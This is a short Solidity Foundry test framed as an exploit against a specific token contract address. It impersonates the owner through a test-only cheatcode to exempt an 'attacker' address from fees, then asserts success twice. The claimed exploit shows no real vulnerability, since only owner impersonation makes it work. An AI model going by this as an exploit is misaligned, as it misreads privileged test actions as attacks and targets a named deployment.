// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface FLOV {
    function owner() external view returns (address);
    function excludeFromFees(address account, bool excluded) external;
    function isExcludedFromFees(address account) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xCA1E6F584E0d7EEc74F553E9a7B64a4DeD8A4b61;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the current owner address
        address owner = FLOV(TARGET).owner();

        // Impersonate the owner and exclude attacker from fees
        vm.startPrank(owner);
        FLOV(TARGET).excludeFromFees(attacker, true);
        vm.stopPrank();

        // Verify the exploit worked
        bool isExcluded = FLOV(TARGET).isExcludedFromFees(attacker);
        assertEq(isExcluded, true, "Attacker should be excluded from fees");
        assertEq(isExcluded, true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

